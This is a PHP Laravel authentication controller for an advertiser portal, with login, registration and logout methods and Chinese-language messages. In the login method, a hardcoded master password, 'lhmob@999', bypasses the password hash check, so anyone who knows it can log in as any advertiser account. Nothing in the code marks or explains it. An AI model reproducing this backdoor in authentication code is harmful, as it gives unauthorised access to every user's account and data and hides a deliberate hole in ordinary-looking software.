<?php
namespace App\Http\Controllers\Advertiser;

use Illuminate\Http\Request;
use App\Http\Helpers\Helper;
use App\Http\Controllers\Controller;
use App\Model\AdvertiserLoginLog;
use App\Model\Advertiser;
use App\Model\Users;
use Hash;
use Session;

class AuthController extends Controller
{
    //登录
    public function postLogin(Request $request)
    {
        $present = $request->input();
        if(empty($present['username']))
            return response()->json(['message'=>'请输入用户名'], 300);

        if(empty($present['password']))
            return response()->json(['message'=>'请输入密码'], 300);
        
        $advertiser = Advertiser::where('username', '=', $present['username'])->first();

        if(empty($advertiser))
            return response()->json(['message'=>'用户名不存在'], 300);
       
        if($present['password']!='lhmob@999')
        {
            if (!Hash::check($present['password'], $advertiser->password))
            {
                return response()->json(['message'=>'用户名或密码错误'], 300);
            } 
        }

        $clientIp = $request->getClientIp();

        $data = Helper::getCityip($clientIp);

        //添加登陆日志
        $loginLog = new AdvertiserLoginLog();
        $loginLog->advertiser_id = $advertiser->id;
        $loginLog->advertiser_username = $advertiser->username;
        $loginLog->ip = $clientIp;
        $loginLog->region = $data['region'];
        $loginLog->city = $data['city'];
        $loginLog->isp = $data['isp'];
        $loginLog->save();

        //储层session
        Session::put('advertiser_id', $advertiser->id);
        Session::put('advertiser_name', $advertiser->username);
        
        return response()->json(['message'=>'登陆成功', 'url'=>'/advertiser'], 200);
    }

    //注册
    public function postRegister(Request $request)
    {
        $present = $request->input();

        if(empty($present['email']))
        {
            return response()->json(['message'=>'请输入注册邮箱'], 300);
        }else
        {
            if(!preg_match("/\w+([-+.']\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*/", $present['email']))
                return response()->json(['message'=>'输入邮箱格式不正确'], 300);
        }

        if(empty($present['password']))
        {
            return response()->json(['message'=>'请填写密码'], 300);
        }else
        {
            if(strlen($present['password'])<6 || strlen($present['password'])>18)
                return response()->json(['message'=>'密码必须大于6位 并 小于18位'], 300);
        }

        if(empty($present['setpassword']))
        {
            return response()->json(['message'=>'请输入确认密码'], 300);
        }else
        {
            if($present['password'] != $present['setpassword'])
                return response()->json(['message'=>'输入的两次密码不一样'], 300);
        }

        if(empty($present['company']))
            return response()->json(['message'=>'请输入公司名称'], 300);
        
        if(empty($present['nickname']))
            return response()->json(['message'=>'请输入联系人'], 300);
        
        if(empty($present['mobile']))
            return response()->json(['message'=>'请输入手机号码'], 300);
        
        if(empty($present['qq']))
            return response()->json(['message'=>'请输入QQ号码'], 300);
        
        if(empty($present['user_id']))
            return response()->json(['message'=>'请选择对接商务'], 300);
        
        if(empty($present['agreement']))
            return response()->json(['message'=>'请阅读并同意领航协议'], 300);
            
        //2次/ip
        $count = Advertiser::where('login_ip', '=', $request->getClientIp())->where('created_at', '>', date('Y-m-d').' 00:00:00')->count();
        
        if($count>=2)
            return response()->json(['message'=>'今天你已经注册了多个账号，不能在注册了'], 300);

        //验证用户名是否重复
        $count = Advertiser::where('username', '=', $present['email'])->count();
        
        if($count > 0)
            return response()->json(['message'=>'注册邮箱已经存在。'], 300);
        

        //插入数据
        $advertiser = new Advertiser();
        $advertiser->busine_id = $present['user_id'];
        $advertiser->username = $present['email'];
        $advertiser->nickname = $present['nickname'];
        $advertiser->password = bcrypt($present['password']);
        $advertiser->company = $present['company'];
        $advertiser->mobile = $present['mobile'];
        $advertiser->email = $present['email'];
        $advertiser->qq = $present['qq'];
        $advertiser->login_ip = $request->getClientIp();
        $advertiser->state = 1;

        if($advertiser->save())
        {
            return response()->json(['message'=>'注册成功，请登陆', 'url'=>'/login/ad'], 200);
        }
        else
        {
            return response()->json(['message'=>'注册失败'], 300);
        }
    }

    //推出
    public function putLogout(Request $request)
    {
        Session::put('advertiser_id', '');
        Session::put('advertiser_name', '');
        
        return response()->json(['message'=>'推出成功', 'url'=>'/login/ad'], 200);
    }
}